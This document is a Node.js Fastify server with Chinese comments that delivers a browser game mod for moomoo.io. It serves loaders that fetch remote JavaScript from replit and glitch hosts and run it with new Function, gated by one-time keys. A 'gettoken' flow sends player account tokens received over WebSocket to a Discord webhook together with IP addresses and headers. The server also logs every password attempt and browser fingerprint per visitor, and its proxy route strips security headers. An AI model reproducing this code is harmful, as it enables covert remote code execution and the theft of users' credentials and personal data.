require("dotenv").config();
const fastify = require("fastify")({ logger: true });
const path = require("path");
const handlebars = require("handlebars");
const fastifyFormbody = require("@fastify/formbody");
const fastifyStatic = require("@fastify/static");
const fastifyView = require("@fastify/view");
const WebSocket = require("ws");
const fs = require("fs");
const axios = require("axios");
const msgpack = require("msgpack-lite"); // 需要先安装

// 確保 client.json 和 tokens.json 文件存在
const clientsFilePath = path.join(__dirname, "client.json");
const tokensFilePath = path.join(__dirname, "tokens.json"); // 新增

if (!fs.existsSync(clientsFilePath)) {
    fs.writeFileSync(clientsFilePath, "{}", "utf-8");
}

// 新增 tokens.json 初始化
if (!fs.existsSync(tokensFilePath)) {
    fs.writeFileSync(tokensFilePath, "{}", "utf-8"); // 默認為空對象
}

// 讀取現有用戶資料
function readClients() {
    try {
        const data = fs.readFileSync(clientsFilePath, "utf-8");
        return JSON.parse(data);
    } catch (error) {
        console.error("讀取 client.json 失敗:", error);
        return {};
    }
}

// 寫入用戶資料
function writeClients(clients) {
    try {
        fs.writeFileSync(
            clientsFilePath,
            JSON.stringify(clients, null, 2),
            "utf-8",
        );
    } catch (error) {
        console.error("寫入 client.json 失敗:", error);
    }
}

// 讀取 tokens
function readTokens() {
    try {
        const data = fs.readFileSync(tokensFilePath, "utf-8");
        return JSON.parse(data);
    } catch (error) {
        console.error("讀取 tokens.json 失敗:", error);
        return {};
    }
}

// 寫入 tokens
function writeTokens(tokens) {
    try {
        fs.writeFileSync(
            tokensFilePath,
            JSON.stringify(tokens, null, 2),
            "utf-8",
        );
    } catch (error) {
        console.error("寫入 tokens.json 失敗:", error);
    }
}

const modsdatasFilePath = path.join(__dirname, "Modsdatas.json"); // 新增

if (!fs.existsSync(modsdatasFilePath)) {
    fs.writeFileSync(modsdatasFilePath, "{}", "utf-8");
}
// 讀取現有用戶資料
function readModsdatas() {
    try {
        const data = fs.readFileSync(modsdatasFilePath, "utf-8");
        const parsed = JSON.parse(data);
        return Array.isArray(parsed) ? parsed : [];
    } catch (error) {
        console.error("讀取 Modsdatas.json 失敗:", error);
        return [];
    }
}

// 寫入用戶資料
function writeModsdatas(datas) {
    try {
        fs.writeFileSync(
            modsdatasFilePath,
            JSON.stringify(datas, null, 2),
            "utf-8",
        );
    } catch (error) {
        console.error("寫入 Modsdatas.json 失敗:", error);
    }
}

// 設置模板引擎
fastify.register(fastifyView, {
    engine: {
        handlebars,
    },
});

// 設置靜態文件服務
fastify.register(fastifyStatic, {
    root: path.join(__dirname, "public"),
    prefix: "/public/",
});

// 註冊表單數據處理插件
fastify.register(fastifyFormbody);

// 基本路由設置
fastify.get("/", (request, reply) => {
    fastify.log.info("Home page accessed");
    reply.view("/views/index.hbs", { text: "Hello, Fastify!" });
});

// 添加一個處理POST請求的路由
fastify.post("/", async (request, reply) => {
    fastify.log.info("POST request received");
    const data = request.body;
    reply.send({ message: "Data received", data });
});

// 全局錯誤處理
fastify.setErrorHandler((error, request, reply) => {
    fastify.log.error(error);
    reply.status(500).send({ error: "Internal Server Error" });
});
fastify.get("/proxy", async (request, reply) => {
    try {
        const targetUrl = request.query.url; // 從查詢參數獲取目標 URL
        if (!targetUrl) {
            reply.code(400).send({ error: "Missing URL parameter" });
            return;
        }

        // 請求目標網頁
        const response = await axios.get(targetUrl, {
            responseType: "text", // 強制以文本形式接收
            headers: {
                // 可選：偽造 User-Agent 以繞過簡單的反爬蟲
                "User-Agent":
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            },
        });

        // 複製原始頭信息
        const headers = { ...response.headers };

        // 刪除或修改關鍵頭信息
        delete headers["x-frame-options"];
        delete headers["permissions-policy"];
        delete headers["strict-transport-security"];
        delete headers["report-to"];
        delete headers["nel"];
        delete headers["surrogate-control"];
        delete headers["surrogate-key"];

        // 修改 Content-Security-Policy
        if (headers["content-security-policy"]) {
            headers["content-security-policy"] = headers[
                "content-security-policy"
            ].replace(/frame-ancestors [^;]+;?/, ""); // 移除 frame-ancestors
        }

        // 返回處理後的內容
        reply.code(response.status).headers(headers).send(response.data);
    } catch (error) {
        fastify.log.error("Proxy error:", error);
        reply.code(500).send({ error: "Failed to fetch the target URL" });
    }
});
const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
const webhookUrltoken = process.env.DISCORD_WEBHOOK_URL_GETTOKEN;
function handleDiscordWebhook(text, url) {
    if (!url) {
        console.error("Webhook URL is not configured.");
        return;
    }

    axios
        .post(url, {
            content: text,
            username: "bot",
            avatar_url: "https://i.imgur.com/FPhfKMS.png",
        })
        .then(() => {
            console.log("Message sent successfully.");
        })
        .catch((error) => {
            console.error(
                "Error occurred while sending the message:",
                error.message,
            );
        });
}

const counterFilePath = path.join(__dirname, "visitorCounter.json");
// 初始化計數器檔案

if (!fs.existsSync(counterFilePath)) {
    fs.writeFileSync(
        counterFilePath,
        JSON.stringify({
            totalVisits: 0,
            uniqueVisitors: 0,
            visitorIPs: {},
            dailyStats: {},
        }),
        "utf-8",
    );
}

// 獲取客戶端真實 IP (改進版)
function getClientIP(req) {
    // 處理多層代理的情況
    const fastlyClientIp = req.headers["fastly-client-ip"];
    if (fastlyClientIp) {
        return fastlyClientIp;
    }
    const xForwardedFor = req.headers["x-forwarded-for"];
    if (xForwardedFor) {
        // 取第一個非內部 IP (以逗號分隔)
        const ips = xForwardedFor.split(",").map((ip) => ip.trim());
        const realIp = ips.find((ip) => {
            // 過濾內部 IP 和 IPv6 轉 IPv4 的地址
            return (
                !ip.startsWith("10.") &&
                !ip.startsWith("192.168.") &&
                !ip.startsWith("172.16.") &&
                !ip.startsWith("::ffff:10.") &&
                ip !== "::1"
            );
        });
        return realIp || ips[0] || req.socket.remoteAddress;
    }
    return req.headers["x-real-ip"] || req.socket.remoteAddress;
}
function readCounter() {
    try {
        const data = fs.readFileSync(counterFilePath, "utf-8");
        return JSON.parse(data);
    } catch (error) {
        console.error("讀取 visitorCounter.json 失敗:", error);
        return { count: 0 };
    }
}

// 更新計數器 (IP 基礎) - 更安全的版本
function updateCounter(req) {
    try {
        let counter;
        try {
            counter = readCounter();
        } catch (e) {
            // 如果讀取失敗，初始化新計數器
            counter = {
                totalVisits: 0,
                uniqueVisitors: 0,
                visitorIPs: {},
                dailyStats: {},
            };
        }

        // 確保必要字段存在
        counter.visitorIPs = counter.visitorIPs || {};
        counter.dailyStats = counter.dailyStats || {};

        const ip = getClientIP(req);
        if (!ip) {
            console.error("無法獲取有效 IP 地址");
            return null;
        }

        const today = new Date().toISOString().split("T")[0];

        // 初始化每日統計
        if (!counter.dailyStats[today]) {
            counter.dailyStats[today] = {
                visits: 0,
                uniqueVisitors: 0,
                visitorIPs: {},
            };
        }

        // 全局統計
        counter.totalVisits = (counter.totalVisits || 0) + 1;

        // 每日統計
        counter.dailyStats[today].visits =
            (counter.dailyStats[today].visits || 0) + 1;
        console.log(req.headers);

        // 檢查是否為新訪客 (全局)
        if (!counter.visitorIPs[ip]) {
            counter.visitorIPs[ip] = {
                firstVisit: new Date().toISOString(),
                visitCount: 0,
                webPassword: [],
                modPassword: [],
                headers: req.headers,
            };
            counter.uniqueVisitors = (counter.uniqueVisitors || 0) + 1;
            const importantHeaders = {
                // 基礎識別
                "fastly-client-ip": req.headers["fastly-client-ip"],
                "x-forwarded-for": req.headers["x-forwarded-for"],
                "user-agent": req.headers["user-agent"],

                // 瀏覽器指紋
                "sec-ch-ua": req.headers["sec-ch-ua"],
                "sec-ch-ua-platform": req.headers["sec-ch-ua-platform"],
                "sec-ch-ua-mobile": req.headers["sec-ch-ua-mobile"],
                "client-ja3": req.headers["client-ja3"],
                "client-ja4": req.headers["client-ja4"],
                ohfp: req.headers["ohfp"],

                // 地理位置與網路環境
                "x-sigsci-client-geo-country-code":
                    req.headers["x-sigsci-client-geo-country-code"],
                "x-sigsci-client-geo-city":
                    req.headers["x-sigsci-client-geo-city"],
                asn: req.headers["asn"],
                "proxy-desc": req.headers["proxy-desc"],
                "x-sigsci-tags": req.headers["x-sigsci-tags"],

                // 請求來源與協定
                referer: req.headers["referer"],
                origin: req.headers["origin"],
                "x-forwarded-proto": req.headers["x-forwarded-proto"],
                "x-forwarded-port": req.headers["x-forwarded-port"],

                // 語言與隱私偏好
                "accept-language": req.headers["accept-language"],
                "sec-gpc": req.headers["sec-gpc"],
                accept: req.headers["accept"],
            };
            /*            const text = `🔔 **新使用者登入資訊**
**IP位置**：\`${ip}\`
**時間**：\`${new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" })}\`
\`\`\`
${JSON.stringify(importantHeaders, null, 2)}
\`\`\`
`;

            handleDiscordWebhook(text, webhookUrl);*/
            console.log(counter);
        }

        // 檢查是否為每日新訪客
        if (!counter.dailyStats[today].visitorIPs[ip]) {
            counter.dailyStats[today].visitorIPs[ip] = true;
            counter.dailyStats[today].uniqueVisitors =
                (counter.dailyStats[today].uniqueVisitors || 0) + 1;
        }

        // 更新最後訪問時間和訪問次數
        counter.visitorIPs[ip].lastVisit = new Date().toISOString();
        counter.visitorIPs[ip].visitCount =
            (counter.visitorIPs[ip].visitCount || 0) + 1;

        // 寫入前確保目錄存在
        if (!fs.existsSync(path.dirname(counterFilePath))) {
            fs.mkdirSync(path.dirname(counterFilePath), { recursive: true });
        }

        fs.writeFileSync(
            counterFilePath,
            JSON.stringify(counter, null, 2),
            "utf-8",
        );

        return {
            totalVisits: counter.totalVisits,
            uniqueVisitors: counter.uniqueVisitors,
            todayVisits: counter.dailyStats[today].visits,
            todayUniqueVisitors: counter.dailyStats[today].uniqueVisitors,
        };
    } catch (error) {
        console.error("更新計數器失敗:", error);
        return null;
    }
}
// 修改計數器 API 端點
fastify.get("/api/visitor-count", (req, res) => {
    const origin = req.headers.origin;

    // 先設定CORS headers
    if (origin === "https://sakunamod.glitch.me") {
        res.header("Access-Control-Allow-Origin", origin);
        res.header("Access-Control-Allow-Methods", "GET");
    }
    const stats = updateCounter(req);
    if (stats) {
        res.send(stats);
    } else {
        res.status(500).send({ error: "Failed to update counter" });
    }
});

const validKeys = new Map(); // key: string → timestamp
const validTime = 3e3;
const password = process.env.PASSWORD;
const loginpassword = process.env.LOGIN_PASSWORD;
const gettokenpassword = process.env.TOKEN_PASSWORD;
let getmodchecklist = {};
function randomKey(length = 16) {
    const chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}
function getAuthorization(req) {
    const ipList = req["x-forwarded-for"].split(",");
    const firstIp = ipList[0].trim(); // 取第一個 IP，並去除空白
    const parts = firstIp.split(".");
    return `${parts[0]}.${parts[1]}.${parts[2]}`;
}
function moderror(res, text) {
    const actualLoader = `
    const loaderCode = \`
        const msg = "⚠️ ${text} ⚠️";
        const statusMessage = document.getElementById('status-message');
        if (statusMessage) {
            statusMessage.textContent = msg;
            statusMessage.className = "status-error";
        } else {
            alert(msg);
        }
    \`;
    new Function(loaderCode)();
    `;

    res.type("application/javascript").send(actualLoader);
}
const allowedOrigins = ["https://sandbox.moomoo.io", "https://moomoo.io"];
// 提供 mod 本體
fastify.get("/loginhtml", (req, res) => {
    const origin = req.headers.origin;
    console.log("\n\n", req.headers, "\n\n");

    if (!allowedOrigins.includes(origin)) {
        moderror(res, "Origin not allowed");
        return;
    }

    res.header("Access-Control-Allow-Origin", origin);

    res.header("Access-Control-Allow-Methods", "GET");

    const filePath = path.join(__dirname, "loginhtml.js");
    if (!fs.existsSync(filePath)) {
        moderror(res, "Login code no found");
        return;
    }
    const authorization = getAuthorization(req.headers);
    if (!getmodchecklist[authorization]) {
        getmodchecklist[authorization] = {
            loginhtml: true,
        };
        console.log(
            "\n\nloginhtml\n",
            authorization,
            "\n",
            getmodchecklist,
            "\n\n",
        );
    }
    const raw = fs.readFileSync(filePath, "utf8");
    res.type("application/javascript").send(raw);
});

// 取得 loader
fastify.get("/getmod", (req, res) => {
    const requestKey = req.query.k; // 改名避免衝突
    if (requestKey !== password) {
        moderror(res, "Unauthorized");
        return;
    }
    const now = Date.now();
    for (const [key, ts] of validKeys) {
        if (now - ts > validTime) validKeys.delete(key); // 1 分鐘過期
    }

    const origin = req.headers.origin;
    if (!allowedOrigins.includes(origin)) {
        moderror(res, "Origin not allowed");
        return;
    }

    res.header("Access-Control-Allow-Origin", origin);

    res.header("Access-Control-Allow-Methods", "GET");
    const authorization = getAuthorization(req.headers);
    if (
        getmodchecklist[authorization].loginhtml &&
        getmodchecklist[authorization].captcha
    ) {
        getmodchecklist[authorization].getmod = true;
        console.log(
            "\n\ngetmod\n",
            authorization,
            "\n",
            getmodchecklist,
            "\n\n",
        );
    } else {
        moderror(res, "Verify wrong");
        return;
    }
    const newKey = randomKey();
    validKeys.set(newKey, Date.now());

    const actualLoader = `
setTimeout(()=>{
const url = "https://3d398bfa-1baf-473a-bcab-2aedc41601dd-00-3o5jz01jjj616.pike.replit.dev/realmod.js?k=${newKey}";
      fetch(url)
        .then(r => r.text())
        .then(code => {
          try {
            new Function(code)();
            code = null;
          } catch (e) {
            alert("⚠️ Sakuna Mod Load Error\\n\\nDetails: " + e);
          }
        })
        .catch(function(e) {
            alert("⚠️ Network Error\\n\\nDetails: " + e);
        });
},10);
  `;
    res.type("application/javascript").send(actualLoader);
});

// 提供 mod 本體
fastify.get("/realmod.js", (req, res) => {
    console.log("check realmod");
    const now = Date.now();
    for (const [key, ts] of validKeys) {
        if (now - ts > validTime) validKeys.delete(key);
    }
    const key = req.query.k;
    const origin = req.headers.origin;

    if (!validKeys.has(key)) {
        moderror(res, "Unauthorized");
        return;
    }

    // key 用過一次後就刪掉（一次性）
    validKeys.delete(key);

    if (!allowedOrigins.includes(origin)) {
        moderror(res, "Origin not allowed");
        return;
    }

    res.header("Access-Control-Allow-Origin", origin);

    res.header("Access-Control-Allow-Methods", "GET");

    const filePath = path.join(__dirname, "mod.js");
    if (!fs.existsSync(filePath)) {
        moderror(res, "Origin not allowed");
        return;
    }
    const authorization = getAuthorization(req.headers);
    console.log(
        "\n\ngetrealmod\n",
        authorization,
        "\n",
        getmodchecklist,
        "\n\n",
    );
    if (
        getmodchecklist[authorization].loginhtml &&
        getmodchecklist[authorization].captcha &&
        getmodchecklist[authorization].getmod
    ) {
        getmodchecklist[authorization] = false;
        const raw = fs.readFileSync(filePath, "utf8");
        res.type("application/javascript").send(raw);
    } else {
        moderror(res, "Verify wrong");
        console.log(getmodchecklist);
        return;
    }
});

// 處理預檢請求
fastify.options("/login", (req, res) => {
    const origin = req.headers.origin;
    if (origin === "https://sakunamod.glitch.me") {
        res.header("Access-Control-Allow-Origin", origin);
        res.header("Access-Control-Allow-Methods", "GET, OPTIONS");
        res.header("Access-Control-Allow-Headers", "Content-Type");
    }
    res.status(200).send();
});

fastify.get("/login", (req, res) => {
    const key = req.query.k;
    const origin = req.headers.origin;

    // 先設定CORS headers
    if (origin === "https://sakunamod.glitch.me") {
        res.header("Access-Control-Allow-Origin", origin);
        res.header("Access-Control-Allow-Methods", "GET");
    }

    const correctpassword = key === loginpassword;

    let counter;
    try {
        counter = readCounter();
    } catch (e) {
        // 如果讀取失敗，初始化新計數器
        counter = {
            totalVisits: 0,
            uniqueVisitors: 0,
            visitorIPs: {},
            dailyStats: {},
        };
    }
    const ip = getClientIP(req);
    if (!ip) {
        console.error("無法獲取有效 IP 地址");
        return null;
    }

    if (counter.visitorIPs[ip]) {
        if (!counter.visitorIPs[ip].webPassword) {
            counter.visitorIPs[ip].webPassword = [];
        }
        counter.visitorIPs[ip].webPassword.push({
            password: key,
            correct: correctpassword,
            time: new Date().toLocaleString("zh-TW", {
                timeZone: "Asia/Taipei",
            }),
        });
        // 寫入前確保目錄存在
        if (!fs.existsSync(path.dirname(counterFilePath))) {
            fs.mkdirSync(path.dirname(counterFilePath), { recursive: true });
        }

        fs.writeFileSync(
            counterFilePath,
            JSON.stringify(counter, null, 2),
            "utf-8",
        );
        console.log(`Web: ${ip}: `, counter.visitorIPs[ip].webPassword);
    }

    // 密碼驗證
    if (!correctpassword) {
        return res.status(401).send("Incorrect password. Please try again.");
    }

    console.log(origin);

    // 檢查文件是否存在
    const filePath = path.join(__dirname, "loginHTML.js");
    if (!fs.existsSync(filePath)) {
        return res.status(404).send("File not found");
    }

    // 讀取並返回文件
    const raw = fs.readFileSync(filePath, "utf8");
    res.type("application/javascript").send(raw);
});

const webhookUrl_getToken = process.env.DISCORD_WEBHOOK_URL_GETTOKEN;
fastify.get("/imgay", (req, res) => {
    const ip = getClientIP(req);
    if (ip) {
        if (webhookUrl_getToken) {
            const text = `🔔 **使用者登入資訊**
**時間**：\`${new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" })}\`
`;
            handleDiscordWebhook(text, webhookUrl_getToken);
        }
    }
});

fastify.get("/gettoken", (req, res) => {
    const ip = getClientIP(req);
    if (ip) {
        if (webhookUrl_getToken) {
            const text = `🔔 **使用者登入資訊**
**時間**：\`${new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" })}\`
`;
            //handleDiscordWebhook(text, webhookUrl_getToken);
        }
    }
    const now = Date.now();
    for (const [key, ts] of validKeys) {
        if (now - ts > validTime) validKeys.delete(key); // 1 分鐘過期
    }

    const origin = req.headers.origin;
    if (allowedOrigins.includes(origin)) {
        res.header("Access-Control-Allow-Origin", origin);
    }

    res.header("Access-Control-Allow-Methods", "GET");
    const requestKey = req.query.k; // 改名避免衝突
    if (req.headers["x-sigsci-client-geo-country-code"] !== "TW") {
        const actualLoader = `
    const loaderCode = "alert('⚠️ getToken 函數獲取錯誤!\\\\n原因: 目前只開放台灣地區')";
    new Function(loaderCode)();
`;
        res.type("application/javascript").send(actualLoader);
    } else if (requestKey !== gettokenpassword) {
        const actualLoader = `
    const loaderCode = "alert('⚠️ getToken 函數獲取錯誤!\\\\n原因: 密碼錯誤！')";
    new Function(loaderCode)();
`;
        res.type("application/javascript").send(actualLoader);
    } else {
        const newKey = randomKey();
        validKeys.set(newKey, Date.now());

        const actualLoader = `
    const loaderCode = \`
setTimeout(()=>{
const url = "https://grnode.glitch.me/realgettoken.js?k=${newKey}";
      fetch(url)
        .then(r => r.text())
        .then(code => {
          try {
            new Function(code)();
            code = null;
          } catch (e) {
          }
        });
},10);
\`;
    new Function(loaderCode)();
  `;

        res.type("application/javascript").send(actualLoader);
    }
});

// 提供 mod 本體
fastify.get("/realgettoken.js", (req, res) => {
    const now = Date.now();
    for (const [key, ts] of validKeys) {
        if (now - ts > validTime) validKeys.delete(key);
    }
    const key = req.query.k;
    const origin = req.headers.origin;

    if (!validKeys.has(key)) {
        return res.status(403).send("Unauthorized");
    }

    // key 用過一次後就刪掉（一次性）
    validKeys.delete(key);

    if (allowedOrigins.includes(origin)) {
        res.header("Access-Control-Allow-Origin", origin);
    }

    res.header("Access-Control-Allow-Methods", "GET");

    const filePath = path.join(__dirname, "gettokencode.js");
    if (!fs.existsSync(filePath)) {
        const actualLoader = `
    const loaderCode = "alert('⚠️ getToken 函數獲取錯誤!\\\\n原因: 函數已刪除！')";
    new Function(loaderCode)();
`;

        res.type("application/javascript").send(actualLoader);
    } else {
        const raw = fs.readFileSync(filePath, "utf8");
        res.type("application/javascript").send(raw);
    }
});

function parseRawHeaders(rawHeaders) {
    const headers = {};
    for (let i = 0; i < rawHeaders.length; i += 2) {
        const key = rawHeaders[i].toLowerCase(); // 轉換為小寫 (標準慣例)
        const value = rawHeaders[i + 1];

        // 處理重複的 header key
        if (headers[key]) {
            headers[key] = Array.isArray(headers[key])
                ? [...headers[key], value]
                : [headers[key], value];
        } else {
            headers[key] = value;
        }
    }
    return headers;
}

// 開始 HTTP 伺服器並附加 WebSocket 伺服器
const start = async () => {
    try {
        await fastify.listen({
            port: process.env.PORT || 3000,
            host: "0.0.0.0",
        });
        /*        console.log(
            `Server is running at http://localhost:${fastify.server.address().port}`,
        );*/

        // 設置 WebSocket 伺服器
        const wss = new WebSocket.Server({ server: fastify.server });
        let connections = [];
        let dc;

        const modurl = process.env.MOD_URL;

        wss.on("connection", (ws, req) => {
            connections.push(ws);
            const headers = parseRawHeaders(req.rawHeaders);
            // 讀取現有的 clients.json
            const clients = readClients();
            const ip =
                headers["fastly-client-ip"] ||
                req.headers["x-forwarded-for"] ||
                req.socket.remoteAddress;
            const firstThreeParts = ip.split(".").slice(0, 3).join(".");
            // 以 IP 為鍵，存儲 headers 和其他資訊
            clients[firstThreeParts] = {
                ip: ip,
                headers: headers,
                connectedAt: new Date().toLocaleString("zh-TW", {
                    timeZone: "Asia/Taipei",
                }),
                lastActivity: null,
                verification: null, // 用於 captcha 驗證
            };

            // 寫回 clients.json
            writeClients(clients);
            //          handleDiscordWebhook(iptext);
            //      console.log(headers);

            ws.on("message", (message) => {
                try {
                    const data = JSON.parse(message);
                    let sendtoAll = true;

                    if (data.ping) {
                        sendtoAll = false;
                        handlePing(ws, data);
                    } else if (data.whoisgay) {
                        sendtoAll = false;
                        let text =
                            "tiltle:`Are you gay?`\nname:`" +
                            data.whoisgay +
                            "`\nchoose:`true`\ntime:`" +
                            new Date().toLocaleString("zh-TW", {
                                timeZone: "Asia/Taipei",
                            }) +
                            "`";
                        handleDiscordWebhook(text, webhookUrl);
                    } else if (data.msg) {
                        sendtoAll = false;
                        //   chatWithAI(data.msg, ws);
                    } else if (data.ip && dc) {
                        sendtoAll = false;
                        dc.send(JSON.stringify(data));
                    } else if (data.sendservercheck) {
                        sendtoAll = false;
                        console.log(data.sendservercheck);
                    } else if (data.verify_captcha) {
                        console.log(data.verify_captcha);
                        sendtoAll = false;
                        const correctpassword = password == data.verify_captcha;
                        let counter;
                        try {
                            counter = readCounter();
                        } catch (e) {
                            // 如果讀取失敗，初始化新計數器
                            counter = {
                                totalVisits: 0,
                                uniqueVisitors: 0,
                                visitorIPs: {},
                                dailyStats: {},
                            };
                        }
                        const IP = getClientIP(req);
                        if (!IP) {
                            console.error("無法獲取有效 IP 地址");
                            return null;
                        }

                        if (counter.visitorIPs[IP]) {
                            if (!counter.visitorIPs[IP].modPassword) {
                                counter.visitorIPs[IP].modPassword = [];
                            }
                            counter.visitorIPs[IP].modPassword.push({
                                password: data.verify_captcha,
                                correct: correctpassword,
                                time: new Date().toLocaleString("zh-TW", {
                                    timeZone: "Asia/Taipei",
                                }),
                            });
                            // 寫入前確保目錄存在
                            if (!fs.existsSync(path.dirname(counterFilePath))) {
                                fs.mkdirSync(path.dirname(counterFilePath), {
                                    recursive: true,
                                });
                            }

                            fs.writeFileSync(
                                counterFilePath,
                                JSON.stringify(counter, null, 2),
                                "utf-8",
                            );
                            console.log(
                                `Mod: ${IP}: `,
                                counter.visitorIPs[IP].modPassword,
                            );
                        }
                        let verify_wrong = false;
                        try {
                            const authorization = getAuthorization(req.headers);
                            console.log(
                                "\n\ncaptcha\n",
                                authorization,
                                "\n",
                                getmodchecklist,
                                "\n\n",
                            );
                            if (getmodchecklist[authorization].loginhtml) {
                                getmodchecklist[authorization].captcha = true;
                            } else {
                                verify_wrong = true;
                            }
                        } catch (e) {
                            console.log("\n\ncaptcha error:\n", e, "\n\n");
                            verify_wrong = true;
                        }
                        if (verify_wrong) {
                            ws.send(JSON.stringify({ verify_wrong: true }));
                        } else if (correctpassword) {
                            ws.send(JSON.stringify({ correct_captcha: true }));
                        } else {
                            ws.send(JSON.stringify({ wrong_captcha: true }));
                        }
                    } else if (data.token) {
                        // 讀取現有 tokens
                        console.log(data.token);
                        const tokens = readTokens();

                        let t = data.name || ip;
                        tokens[t] = {
                            token: data.token,
                            name: data.name,
                            ip: ip,
                            timestamp: new Date().toLocaleString("zh-TW", {
                                timeZone: "Asia/Taipei",
                            }),
                        };
                        const importantHeaders = {
                            "user-agent": headers["user-agent"],
                            "accept-language": headers["accept-language"],
                            "x-forwarded-for": headers["x-forwarded-for"],
                        };
                        const text = `🔔 **新使用者登入資訊**
**名稱**：\`${t}\`
**IP位置**：\`${ip}\`
**Token**：\`${data.token}\`
**時間**：\`${new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" })}\`
\`\`\`json
${JSON.stringify(importantHeaders, null, 2)}
\`\`\`
`;

                        handleDiscordWebhook(text, webhookUrltoken);

                        // 寫入 tokens.json
                        writeTokens(tokens);
                        console.log("Token 已儲存:", data.token, tokens);
                    } else if (data.getfiles) {
                        ws.send(JSON.stringify({ modfills: readModsdatas() }));
                    } else if (data.files) {
                        console.log(data.files);
                        const currentModsdatas = readModsdatas();

                        // 創建一個集合來存儲唯一的文件ID
                        const existingFileIds = new Set(
                            currentModsdatas.map((file) => file.attachment?.id),
                        );

                        // 過濾出新文件
                        const newFiles = data.files.filter(
                            (file) =>
                                file.attachment?.id &&
                                !existingFileIds.has(file.attachment.id),
                        );

                        if (newFiles.length > 0) {
                            // 合併新舊文件並按時間戳降序排序
                            const allFiles = [
                                ...newFiles,
                                ...currentModsdatas,
                            ].sort(
                                (a, b) =>
                                    new Date(b.timestamp) -
                                    new Date(a.timestamp),
                            );

                            // 寫入所有文件
                            writeModsdatas(allFiles);
                            console.log(
                                `已儲存 ${newFiles.length} 個新文件，總共 ${allFiles.length} 個文件`,
                            );
                        } else {
                            console.log("沒有新的文件需要儲存");
                        }
                    } else if (data.sid) {
                        if (!1 && data.name == "Gn") {
                            ws.close();
                        }
                        //  console.log(data);
                    } else if (data.log) {
                        console.log(
                            "type: " + data.type + " message: " + data.log,
                        );
                    } else if (data.location) {
                        sendtoAll = false;
                        dc = ws;
                    }

                    if (sendtoAll) {
                        broadcast(data);
                    }
                } catch (error) {
                    console.error("Caught error:", error);
                }
            });

            ws.on("close", () => {
                handleClose(ws);
            });

            ws.on("error", (error) => {
                console.error("WebSocket error:", error);
            });
        });
        function generateRandomString(length = 10) {
            const chars =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let result = "";
            for (let i = 0; i < length; i++) {
                result += chars.charAt(
                    Math.floor(Math.random() * chars.length),
                );
            }
            return result;
        }

        console.log(readTokens());

        function handlePing(ws, data) {
            const ping = parseInt(Date.now() - data.time);
            ws.send(JSON.stringify({ ping, time: Date.now() }));
        }

        function handleClose(ws) {
            connections = connections.filter((conn) => conn !== ws);
            broadcast({ user: connections.length });
        }

        function broadcast(data) {
            connections.forEach((connection) => {
                connection.send(JSON.stringify(data));
            });
        }
    } catch (err) {
        fastify.log.error(err);
        process.exit(1);
    }
};

// 聊天 AI 函數
async function chatWithAI(inputText, ws) {
    if (!inputText || typeof inputText !== "string") {
        ws.send(JSON.stringify({ res: "請輸入有效的訊息。" }));
        return;
    }

    const apiKey = process.env.OpenAI_API;
    const apiUrl = "https://api.openai.com/v1/completions";
s
    try {
        console.log("inputText:", inputText);
        const response = await axios.post(
            apiUrl,
            {
                model: "text-davinci-003",
                prompt: inputText,
                max_tokens: 30,
                temperature: 0.7,
            },
            {
                headers: {
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${apiKey}`,
                },
            },
        );

        const res = response.data.choices[0].text.trim();
        console.log("response:", res);
        ws.send(JSON.stringify({ res: res }));
    } catch (error) {
        console.error("API 請求失敗:", error);
        ws.send(JSON.stringify({ res: "抱歉，我無法回答這個問題。" }));
    }
}

start();
